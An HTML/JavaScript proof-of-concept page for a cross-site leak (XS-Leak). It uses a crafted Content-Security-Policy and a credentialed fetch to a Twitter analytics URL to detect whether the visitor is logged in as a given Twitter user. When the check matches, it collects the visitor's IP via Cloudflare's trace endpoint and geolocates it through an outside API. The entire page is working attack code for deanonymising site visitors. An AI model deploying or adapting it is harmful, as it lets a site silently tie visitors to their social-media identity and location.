<!DOCTYPE html>
<html>
    <head>
        <title>XPOC</title>
        <meta http-equiv="Content-Security-Policy" content="default-src 'unsafe-inline' https://red-assassin.github.io https://api.hackertarget.com/ https://www.cloudflare.com https://analytics.twitter.com https://code.jquery.com https://maxcdn.bootstrapcdn.com https://cdnjs.cloudflare.com https://maxcdn.bootstrapcdn.com">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    </head>
    <body>
        <div class="container pt-3">
            <h1>
                XSLEAK - POC - CSP Violation
            </h1>
            <div class="form-group">
                <br />
                <div class="row">
                    <div class="col-md-10">
                        <input type="text" placeholder="Enter twitter username" class="form-control" id="do">
                    </div>
                    <div class="col-md-2">
                        <button type="button" class="btn btn-success" onclick="checkOwner();">Check</button>
                    </div>
                </div>
            </div>
            <div class="container" >
                <code id="result">
                </code>
                <div class="row" style="margin-top: 1.5em;">
                    <div class="col-md-7">
                        <code id="whoisinfo">

                        </code>
                    </div>
                    <div class="col-md-5">
                        <code id="whoisinfo2">

                        </code>
                    </div>
                </div>
            </div>
        </div>
        <script>
           window.blocked = false;
            window.dataip = null
            var cloudFlare = "https://www.cloudflare.com/cdn-cgi/trace";
            var whois = "https://api.hackertarget.com/geoip/?q="

            var getwhois = (ip) => {
                fetch(whois+ip).then((resp) => {
                    return resp.text();
                }).then((data) => {
                    document.getElementById("whoisinfo2").innerHTML += "<pre>"+data+"</pre>";
                });
            }

            var getUserInfo = () => {
                fetch(cloudFlare).then(
                    (resp) => {
                        return resp.text();
                    }
                ).then((data) => {
                    document.getElementById("whoisinfo").innerHTML += "<pre>"+data+"</pre>";
                    window.dataip = data.split("\n")[2].split("=")[1];
                    getwhois(window.dataip);
                });
            }

            document.addEventListener('securitypolicyviolation', e => {
            // goes through here if a 3xx redirect to another domain happened
                console.log(e.blockedURI);
                window.blocked = true;
            });
            function checkOwner(){
                var result = document.getElementById("result");
                var user = document.getElementById("do").value;
                fetch('https://analytics.twitter.com/user/'+user+'/home', {mode: 'no-cors',credentials: 'include'});
                setTimeout(() => {
                    
                    if(window.blocked)
                        result.innerHTML = "[+] Nothing found.<br />";
                    else{
                        result.innerHTML = "[+] Twitter user "+user+", Details of the User<br />";
                        getUserInfo();

                    }
                }, 3000);
                
            }
        </script>
    </body>
</html>
